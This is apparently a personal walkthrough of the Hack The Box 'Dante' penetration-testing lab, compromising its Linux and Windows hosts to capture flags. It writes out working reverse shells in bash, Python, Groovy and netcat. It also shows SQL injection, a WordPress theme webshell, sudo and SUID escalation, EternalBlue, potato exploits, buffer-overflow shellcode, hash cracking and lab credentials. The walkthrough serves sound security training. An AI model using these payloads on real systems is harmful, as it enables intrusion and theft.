# Dante
#prolab

### Description: 
    Dante is a modern, yet beginner-friendly pro lab that provides the opportunity to learn common penetration testing methodologies, and gain familiarity with tools included in the Parrot OS Linux distribution. Dante LLC have enlisted your services to audit their network. The company has not undergone a comprehensive penetration test in the past, and want to reduce their technical debt. They are concerned that any actual breach could lead to a loss of earnings and reputation damage.

	Upon breaching the perimeter, you are required to explore the network, moving laterally and vertically, until you gain administrative control over all hosts and reach domain admin. You will level up your skills in information gathering and situational awareness, be able to exploit Windows and Linux buffer overflows, gain familiarity with the Metasploit Framework, and much else!

	There are many flags to be captured along the way, some on the main attack path and others in side-quests that you must go looking for. Submitting flags will propel you through the Hall of Fame, rewarding you with badges in the process.

	This **Penetration Tester Level I** lab will expose players to:

	-   Enumeration
	-   Exploit Development
	-   Lateral Movement
	-   Privilege Escalation
	-   Web Application Attacks

	The firewall at 10.10.110.2 is out of scope

### Entry point: 
    10.10.110.0/24
### Flags   : `27`
### Machines : `14`

---

## I'm nuts and bolts about you

We ping the network for live IP's and then perform a full scan on them
```bash
nmap -sS -n 10.10.110.0/24
```

`10.10.110.100` is the only live IP so we scan all the ports of it.

```bash
nmap -sC -sV -A -T4 -p- 10.10.110.100 --open
```

![[Pasted image 20210902212056.png]]

We find the first flag in the scan results of the wordpress site and we also find something interesting `ftp` allows anonymous login.
## It's easier this way
We try the anonymous login
```bash
ftp 10.10.110.100
```

```
username: anonymous
password: anonymous or blank
```

We find a file in `Transfer/Incoming` `todo.txt` we use get to download it locally.

It had some interesting details

```
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
```

Let's go and check the Wordpress site now.

The website doesn't look much interesting it's only a static website. I ran wpscan and found out the theme is `twentytwenty` but from my previous experience this theme vulnerability can only be exploited after logging in.

We can find the login page either through directory busting but also its a wordpress site you can just try

```bash
/wp-login
/wp-admin
```

In this case `/wp-admin` worked, We know one of the username is `James` from the `todo.txt` and his password is insecure.

So I ran a bruteforce login with `rockyou.txt`

```bash
wpscan --url http://10.10.110.100:65000/wordpress/ --usernames James --passwo  
rds /usr/share/wordlists/rockyou.txt
```

After 10 minutes or so the password didn't look so insecure using `rockyou.txt`. So I tried to generate a wordlist from the wordpress site and run it parallely just in case.

```
cewl -w wordpress -d 5 http://10.10.110.100:65000/wordpress/
```

I used the this list to bruteforce and kinda as expected it worked way faster.

`James:Toyota`

Just in case I checked if Toyota was in rockyou indeed it was there but at the 150000th line but at 399 in the generated one. Lesson learnt generate a wordlist from the site and run it parallely.

We log in to wordpress login, I tried the FTP and SSH but it didn't work.

As previously done on spectra
- you edit the theme's 404 template
- add a php reverse shell
- open a listener
- navigate to 404.php
- you get a reverse shell

We use [pentest monkey's reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) Change the ip and port to yours.

But weirdly it was not working, So I tried a simple php exec

```
<?php exec("bash -c 'exec bash -i &>/dev/tcp/10.10.14.2/1234 <&1'");?>
```

We update it, it shows an error for `twentytwenty` theme so we cycle through others and it updates for `twentynineteen`

So we navigate to 
```
http://10.10.110.100:65000/wordpress/wp-content/themes/twentynineteen/404.php
```

Change our user to james using the previous password and we find the flag in james home directory.

Listing everything in the directory we find a `.bash_history` file reading it we find the mysql creds for user `balthazar` so we try to ssh and it works.

![[Pasted image 20210903112332.png]]
`TheJoker12345!`

## Show me the way
Lets start the Privilege escalation and look for SUID binaries.

`sudo -l` is not working as its saying balthazar or james can't run as sudo 
So we use the old faithful

```bash
find / -perm -u=s -type f 2>/dev/null
```


The out of the ordinary ones are 
```
/usr/bin/vmware-user-suid-wrapper
/usr/bin/find
```

Let's goto GTFO and get ourselves a root.
We use the find suid

```bash
find . -exec /bin/sh -p \; -quit
```

We get a root shell, We go to the root directory and find `flag.txt` along with `wordpress_backup`

Now to login as root for later uses we add our local `id_rsa.pub` to the authorized keys on the target machine and login as root from our machine.

```
ssh root@10.10.110.100
```

The above command will only work after you add your `id_rsa.pub` key to target's authorized keys.

## Seclusion is an illusion

Let's check the ip for the internal network `ifconfig`

![[Pasted image 20210903121213.png]]

The internal network is `172.16.1.0/24`

So what I learnt from reading a shit ton on pivoting and port forwarding is
- sshuttle, chisel doesn't work with nmap scans, you can only use them to access web pages and such
- To do an nmap scan you need to use proxychains but it's slow af and doesn't allow ICMP requests
- So upload an nmap binary into target machine do a basic host ping scan and do aggressive ones later.

static binaries to upload => https://github.com/andrew-d/static-binaries
Pivoting References
- https://cheatsheet.haax.fr/network/pivot_techniques/
- https://blog.techorganic.com/2012/10/10/introduction-to-pivoting-part-2-proxychains/
- https://sushant747.gitbooks.io/total-oscp-guide/content/port_forwarding_and_tunneling.html


The Pivoting cmds

```bash
ssh -D 8888 -N balthazar@10.10.110.100
sshuttle -r balthazar@10.10.110.100 172.16.1.0/24
```
Balthazar Passwd: `TheJoker12345!`

The `8888` port should be mentioned in the `/etc/proxychains.conf` file

## An open goal

I performed the basic scan on `NIX01` and found 2 FTP (`172.16.1.5, 172.16.1.12`) servers `.5` was working with anon login and I found a flag in it. It wasn't the next flag but still a flag. [[#172 16 1 5]]

Note: FTP was only working through `NIX01` not on my machine due to security reasons implemented on FTP side, It was logging in but not executing any commands.

---

So I opened all the ip's which had http/s hosted and found an LFI(thanks to the previous `todo.txt`) on `172.16.1.10` read the `/etc/passwd` file and found a user margaret and read the flag file using `/home/margaret/flag.txt` which was the next flag but didn't have an idea how to get shell.

## Again and again

Lets check the other IP's and try to directory bust using wfuzz on the them.

```bash
wfuzz -u "http://172.16.1.12/FUZZ" -w /usr/share/wordlists/dirb/common.txt --hc 404
```

We find a `/blog` in .12 and the categories looked like an SQL call, So let's try sqlmap.

```bash
sqlmap -u "http://172.16.1.12/blog/category.php?id=2" -p id --technique=U
```

looks like it's vulnerable to SQLi lets get the dbs, tables and dump'em all.

```bash
sqlmap -u "http://172.16.1.12/blog/category.php?id=2" -p id --technique=U --dbs
```

There's a database called flag

```bash
sqlmap -u "http://172.16.1.12/blog/category.php?id=2" -p id --technique=U -D  
flag --tables
```

The table is also called flag so we dump it.

```bash
sqlmap -u "http://172.16.1.12/blog/category.php?id=2" -p id --technique=U -D  
flag -T flag --dump-all
```

There's also another database called `blog_admin_db` so we check that too

## Snake it 'til you make it

I kind of had a weird feeling with `172.16.1.10` it had wordpress hosting in it and also LFI so I tried wpscan.

There were wordpress files in the first machine /var/www/html So i tried to check in this too. As `wp-config.php` is a php file it gets executed by the webserver when trying to read it so we have to use a [php filter](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html) 

So we'll get a base64 encoded text just use cyberchef to decode it and get creds.
This was our decoded text and we have creds for margaret lets ssh.
```php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

The SSH leads us into a limited shell, check which one it is and use the appropriate one to escape.
https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/

We use `VIM` for this.

```bash
:set shell=/bin/sh
:shell
```

Use this to get an interactive shell

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

We check frank's home directory and find a slack backup in `/Downloads`. We can't open all directories in it but it has a zip, so let's download it and try to find anything.

We host a python server on the target machine and use it to download the zip ont our machine

server hosting
```bash
python3 -m http.server
```

downloading
```bash
wget http://172.16.1.10:8000/Test\ Workspace\ Slack\ export\ May\ 17\ 2  
020\ -\ May\ 18\ 2020.zip
```

In the `secure`  directory in the logs we find both margaret and frank's password (`69F15HST1CX`). So we switch users, we don't have sudo privs for margaret so we have to ssh as frank.

🟥 For all SSH use proxychains if you are doing it from you machine.

Fucking turns out it was the wrong password (after crying for 3 hours), I realized after reading the convos a bit more that margaret was moving slack and not frank so the slack original data is in margaret dirs.

After searching I found the message logs in `/home/margaret/.config/Slack/secure` and frank's password in it was working. (`TractorHeadtorchDeskmat`)

We use [pspy](https://github.com/DominicBreuker/pspy) to ind any secret cronjobs run by any user.

![[Pasted image 20210907161253.png]]

it looks like it's deleting `call.py` and `urllib.py` in the /frank dir but we can see something in `__pychache__` when we run apache_restart.py the import is running them. So we can make a fake call.py or urllib.py to make a reverse shell to us.

We just modify the pentest monkey python one liner to a script

```Python3
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.14.23', 3334))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(['/bin/sh', '-i'])
```

We put this in either `call.py` and `urllib.py` in `/home/frank` and fire up a listener and wait and we get the root shell.

## Five Doctors

Let's go and do the `.12` which had a `sqli`

We find another use called `ben` who didn't register through form so we try to decrypt his MD5 password hash.

I tried using hashcat but it was overheating the GPU and stopping, So again let's go back to the old faithful.

https://www.dcode.fr/md5-hash

The decoded password is `Welcometomyblog`. Just in case I checked the `rockyou.txt` and it was 10 millionth line well fuck.

Let's SSH into it using these creds.


My dumbass Currently only knows very few ways of priv esc which are

```bash
sudo -l 		//SUID
crontab -l		//Cronjobs
sudo --version	//Outdated sudo
```

## Minus + minus = plus?

So I checked them and it had an outdated sudo googled the exploit and found poc on [exploit-db](https://www.exploit-db.com/exploits/47502).

```bash
sudo -u#-1 /bin/bash
```

Just in case take the shadow and passwd files and find passwords of the the other user `julian` which is `manchesterunited`

decrypted from hashcat

julian.txt => $1$CrackMe$U93HdchOpEUP9iUxGVIvq/

```bash
hashcat -m 500 julian /etc/john/rockyou.txt
```

and we are root. `.12` is done.

## Congratulations to a perfect pear

`.102` It shows us it is a Online Marriage Registration System (OMRS), So we look online for an exploit and we find one in bash but it has some syntax error so we use the 
other python one fro here https://github.com/ricardojoserf/omrs-rce-exploit

We download the file and execute it.

The -m and -p are the mobile number and password you used to register in the OMRS

```bash
python3 omrs.py -u http://172.16.1.102/ -c whoami -m 6789 -p 1234

python3 omrs.py -u http://172.16.1.102/ -c "type C:\Users\blake\Desktop\flag.txt" -m 6789 -p 1234
```

We get the flag.

## MinatoTW strikes again

The problem with the exploit was we were not able to upload any files. So we have to go to the registration form and upload the winpeas and nc binaries with png extensions and the names are changes in the directory we were in. So we had to change them back to execute them.

```bash
python3 omrs.py -u http://172.16.1.102/ -c 'powershell -nop -c "Rename-Item -Path 'd5ffca6b7e2bf2854daa85f71841ccf21632552801.png' -NewName 'nc.exe' " ' -m 6789 -p 1234

python3 omrs.py -u http://172.16.1.102/ -c ".\nc.exe 10.10.14.23 1210 -e C:\Windows\System32\cmd.exe" -m 6789 -p 1234

```

and we get our reverse shell as we already uploaded the winpeas we can just change it's name too and execute it.

```PowerShell
powershell -nop -c "Rename-Item -Path '69f5c4ece9a03196703160274d6aa9671632552801.png' -NewName 'winpeas.exe' " 
```

Tried to run Rogue Potato but windows Defender was stopping it from giving a shell but we can see a `C:\Apps\SERVER.EXE` in the windows defender whitelist paths

So it maybe our path to salvation. After finding out we should do buffer overflow and he flag task name being `MinatoTW`  I did a quick google search to find 

`copy C:\Users\Administrator\Desktop\flag.txt C:\xampp\htdocs\user\images\flag3.txt`

```
.\RoguePotato.exe -r 10.10.14.23 -e "dir C:\Users\Administrator > out1.txt" -l 4444
```

copy C:\Users\blake\Desktop\flag.txt  C:\xampp\htdocs\user\images\flag2.txt

```
.\RoguePotato.exe -r 10.10.14.23 -e ".\nc64.exe 10.10.14.23 4433 -e C:\Windows\System32\cmd.exe" -l 4444
```

For some reason the flag was there and it worked with rogue potato for someone else I think, So I just used it, tried to replicate it but it wasn't working. Well I'll ask in discord later again.

## Feeling fintastic

Let's go to `172.16.1.17`, it has web page and 445 (microsoft-ds) which is most likely a samba share. 

We enumerate the shares

```bash
proxychains enum4linux -a 172.16.1.17
```

We find a share called `forensics`. Let's mount it and see.
We find a monitor file, use `get` to download it.

use strings to read it, it looks like http requests and responses, maybe there's a login creds somewhere in here but it's too long to read

So we move the strings output

```bash
strings monitor >> readable
cat readable | grep "pass"
```

We find 2 login attempts and one of the creds work for the webmin portal in port `10000` 

We find shell in `other` and check the dir to find `flag.txt` (We are already root) and a `pcap` file, couldn't download it for now.

## Let's take this discussion elsewhere

Let's go with `172.16.1.13` , there's only web pages in it so we go with directory busting

```bash
wfuzz -u "http://172.16.1.13/FUZZ" -w /usr/share/wordlists/dirb/common.txt --hc 404
```

We find one called `/discuss`

It's a technical discussion forum, didn't find anything like what it's built with or anything, so just googled `Technical Discussion forum Exploit` and got an exploit-db link.

https://www.exploit-db.com/exploits/48512

So we follow the instructions to get a reverse shell. Turns out not all shells are being uploaded and with a normal `?cmd` not all commands are being executed, some kind of filtering maybe we google AV bypass shells.

My bad it's not that the commands are being limited but it was a fucking windows machine now I have to look for windows reverse shells. So what we do is upload (was taking in files when we register/sign-in) at `nc.exe` and use it to do a reverse shell.

We also have to upload a shell.php which we can use to execute the scripts.

```HTML
/discuss/ups/shell.php?cmd=nc.exe 10.10.14.23 1210 -e C:\Windows\System32\cmd.exe
```

We can find the flag on Desktop, We can get admin privileges and find passwords but I'm bad at windows priv esc so I kinda skipped this.

## Compare my numbers

After a week break and read up on windows priv esc

We can upload winPEAS.exe and try to run it and see.

On attacker machine
```bash
python3 -m http.server 1235
```

On the Windows machine to download it.
```PowerShell
certutil -urlcache -split -f [http://10.10.14.23:1235/winPEAS.exe](http://10.10.14.23:1235/winPEAS.exe) winPEAS.exe
```

Turns out access is denied so I just use the previous way how we uploaded `nc.exe` 

and we find out  a vulnerable service call Druva insync and we search for it's exploits.

We find a python exploit and a powershell exploit as python is not on windows we use ps script.

The script is a POC so it doesn't do anything so we have to change the `$cmd` variable in it to give us a reverse shell.

```PowerShell
$cmd = "C:\xampp\htdocs\discuss\ups\nc.exe 10.10.14.23 4443 -e C:\Windows\System32\cmd.exe"
```

and we get a reverse shell and we find the flag in `Administrator/Desktop`


## That just blew my mind

Let's move on to `172.16.1.20` 

Lets do a samba enum

```bash
proxychains enum4linux -a 172.16.1.20
```

We don't find much of anything. Until now I've been using the output of the nmap scan of which ip's and ports are up without vulns or any scripts running on them, so I was in the dark most of the time. So I decided even if it takes a day or two I need a full enumerated scan to properly work on it and decided to do it.

I tried to do this with metasploit but turns out it works normally too

```bash
proxychains nmap --script vuln -sT -A -T4 -Pn 172.16.1.20 --open -d
```

We find it is vulnerable to eternal blue, so we go to metasploit 

```
use exploit/windows/smb/ms17_010_psexec
set payload windows/x64/meterpreter/reverse_tcp
getsystem
hashdump
```

Set lhost to the ip that vpn assigns to you not the pivoted one and use the `reverse_tcp` payload.

We use `getsystem` to get privs and `hashdump`to get the hashes.

We try to crack the hashdump using john

```bash
john --format=NT passwd --wordlist=/etc/john/rockyou.txt\
john --show --format=NT passwd
```

```
Administrator:Password12345:500:aad3b435b51404eeaad3b435b51404ee:9bff06fe611486579fb74037890fda96:::  
Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
mrb3n:Welcome1:2104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

`administrator:KillEmAll! `

We load kiwi and use `lsa_dump_secrets` and find put the default login password for it `DishonestSupermanDiablo5679` we don't know the username but from `creds_msv`, I think it is `katwamba`

Let's try to rdp into the machine with katwamba creds and it works, we find our flag on the desktop.

## mrb3n leaves his mark

We open firefox as it is also present in the desktop to find another subnet in history `172.16.2.101`

Turns out this is a Domain Controller which has Active Directory Info in it.

We press Start and at the end we find Administrative Tools and in it we find `Active Directory Users` and from the hint in the flag submission `mrb3n leaves his mark` and we find the flag in the description.

We find employee backup on the desktop you can download it in remmina(you'll have add file kind of option on top left) if you can add a shared folder onto it and copy to that shared folder

The excel sheet looks like it only has username but if you look care fully at the top of the column you'll find that B is hidden clicking on it we find the passwords. Copy them for later use.


## Update the policy!


`1.101`

We have ftp and winrm open and smb is not replying.

Let's bruteforce ftp from the employees file.

![[Pasted image 20210921230437.png]]

Put them in this format so that it doesn't try to iterate through permutations

```bash
hydra -C employee ftp://172.16.1.101
```

`dharding:WestminsterOrange5`

Let's try the creds with evil-winrm too but it was not working.
After logging in ftp the shit doesn't work for some commands because of smn called active and passive ftp.

We have to turn on the passive mode by typing in `passive` and everything will work normally.

The file on it says that the password is same as ftp but with a different number. You can write a script to test that.

But there is `crackmapexec` to do exactly that. 

So we generate the password list

```bash
echo "WestminsterOrange" >> 1.txt
for i in {1..100}; do echo $i; done >> 2.txt
/usr/lib/hashcat-utils/combinator.bin 1.txt 2.txt >> pass.txt

crackmapexec winrm 172.16.1.101 -u dharding -p pass.txt
```

The new password is `WestminsterOrange17`

and we login to winrm 

```
evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17
```

We find the flag in Desktop of dharding now we have to upload winPEAS for priv esc

turns out you can do that through `evil-winrm` 

```
upload /home/HTB/HTB-writeups/Pro-Labs/Dante/assets/winPEASx64.exe
```

## Single or double quotes

You can upgrade to admin from an unquoted service path but I'm not going to do it now because lost fucking metasploit.


# Double Pivot

From what I can understand It's a routing thing not a pivoting thing, that's why we can't access the `.2.*` network. So I have to go to a previously exploited linux machine and add a `.2.*` route and use sshuttle to our machine and access it. The only properly shell accessible with root machine is `.1.10` so we try and test it. 

```bash
ip route add 172.16.2.0/24 via 172.16.1.1
```
`TractorHeadtorchDeskmat`

We do sshuttle things same as before

```bash
ssh -D 1080 -N frank@172.16.1.10
sshuttle -r frank@172.16.1.10 172.16.2.0/24
```
frank Passwd: `TractorHeadtorchDeskmat`

From the words of a god on discord.
![[Pasted image 20211009221406.png]]

I still couldn't access the `2.101` from the firefox history.

So I tried a dumb thing by looking at this from varonis [AD enum](https://www.varonis.com/blog/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/)

and got this and everything started to fall into its place.

```bash
crackmapexec winrm 172.16.2.0/24 -u administrator -p "KillEmAll!"
```

![[Pasted image 20211009221641.png]]

`evil-winrm -i  172.16.2.5 -u administrator -p "KillEmAll!"`

but we can't ssh into any machine from `winrm` so we try to rdp into it but it is blocked so we try to turn it on and then try again which worked.

Turning RDP on => https://pureinfotech.com/enable-remote-desktop-powershell-windows-10/

```
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

We can see that we have `2.6, 2.101` in 2.5 through `arp -a`

After scanning properly(which I didn't) we find out that we have to we have to ssh into them. [[#172 16 2 101]] machine, [[#172 16 2 6]] machine

## One misconfig to rule them all...

We access a powershell session to `2.5` from `1.20`  or login via evil-winrm after doing sshuttle from `.10`

We force trust `2.5` and get the session

```PowerShell
Set-Item wsman:\localhost\client\TrustedHosts -Value 172.16.2.5 -Force
$cred = get-credential (login as administrator)
Enter-PSSession -ComputerName 172.16.2.5 -Credential $cred
```

![[Pasted image 20211006131654.png]]

We find a `jenkins.bat` file, we know `1.19` has jenkins login so we use the cred we find.

`Admin_129834765:SamsungOctober102030`

## It's getting hot in here

We find the flag in `C:\Users\jbercov\Desktop`

## Very well, sir

We find the in the FLAG_HERE script?? or smn

Now we open the `script console`  and try to get a reverse shell from the groovy script, we found a ton of reverse shell scripts on google for groovy.

```Groovy
Thread.start {
String host="10.10.14.23";

int port=4242;

String cmd="bash";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```

and we just run this with a listener on our machine. If the target was a windows one we would've used `String cmd="cmd.exe";`

For an interactive shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

We're logged in as jenkins so we try to do horizontal priv esc and just run `pspy64` for cronjobs and we find this.

![[Pasted image 20211006182941.png]]

```bash
2021/10/06 05:57:01 CMD: UID=0    PID=8718   | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC
```

We found ian creds running a mysql cron and we switch user

## We're going round in circles

We do the same shit we do for user recon

```bash
id
sudo -l
crontab -l 
sudo --version
uname -a
```

In `id` we find that ian is in disk group and from hacktricks we can do priv esc 

First we have to find where `\` is mounted in the system.
![[Pasted image 20211006184756.png]]

```bash
df -h
debugfs /dev/sda5
cat /root/flag.txt
```

## 172.16.2.101

We can use previous creds from [[#Minus minus plus]] of julian and use it to ssh into it and find the user flag.

There's a folder named PEDA which is a clone of this repo => https://github.com/longld/peda and from the name of the next flag heading I think it is a BoF. So I googled for a python gdb bufferoverflow script or smn similar and we find this

```python
import os
for i in range(255):
        os.system(""" /usr/sbin/readfile $(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"A"*(88-27)+"{}\xe3\xff\xff\xff\x7f"') """.format("\\x"+hex(i).split('x')[1]))
```

When this code is executed it continuously overflows and when you do `ctrl+c` a root shell will pop and we can get the flag

## 172.16.2.6

We can access `2.6` only from `2.101` not eve `2.5` we use the same creds as julian from previous to ssh into it and we get in and wind the first flag.

We also find the below message which hints to `1.5` machine.

![[Pasted image 20211010130932.png]]

We don't find any other users but just in case we check the `/etc/passwd`for users and we find there's another user called `plongbottom` who we found creds for in the employee creds file from `1.20` and we switch to that user and check id and see he's in the sudo grp which means we can directly switch

```bash
id
```


![[Pasted image 20211013134638.png]]

`plongbottom:PowerfixSaturdayClub777`

```bash
sudo su
```

we are root and we find the flag

## 172.16.1.5

We find the below creds for `MSSQL` from `2.6` and use them to login

mssql => `Sophie:XTerrorInflictPurpleDirt996655`

Using sqsh we can easily login but it opens a mssql shell which is pretty shit.

`sqsh -S 172.16.1.5 -U Sophie -P TerrorInflictPurpleDirt996655`

So we use this cheatsheet => https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

We can execute commands using xp_cmd in the sql shell.

```MSSQL
EXEC xp_cmdshell 'ls';
```

We can find sophie creds in `C:\DB_Backups\db_backup.ps1`

winrm => `sophie:Alltheleavesarebrown1`

```bash
evil-winrm -i 172.16.1.5 -u sophie -p "Alltheleavesarebrown1"
```

and checking privs and sysinfo it looks like we can do Juicy Potato exploit (`SeChangeNotifyPrivilege - enabled`).

```
whoami /priv
Get-ComputerInfo
```

![[Pasted image 20211013214653.png]]
![[Pasted image 20211012153117.png]]

We can download the potato.exe from => https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard

Some other sources for potato walkthroughs 
- https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato

There was no need to input CLSID here. 

potato => `echo "type C:\users\administrator\desktop\flag.txt" | .\jp.exe -p C:\windows\system32\cmd.exe -t * -l 9999`

The command is echoed and then the potato was executed because the shell pops for a second and then dies was probably same with the rogue potato will try again later.

You find flags in sophie folder,  admin folder and ftp folder in `C:\`for `1.5` and also another one at the start when you did anon login in ftp.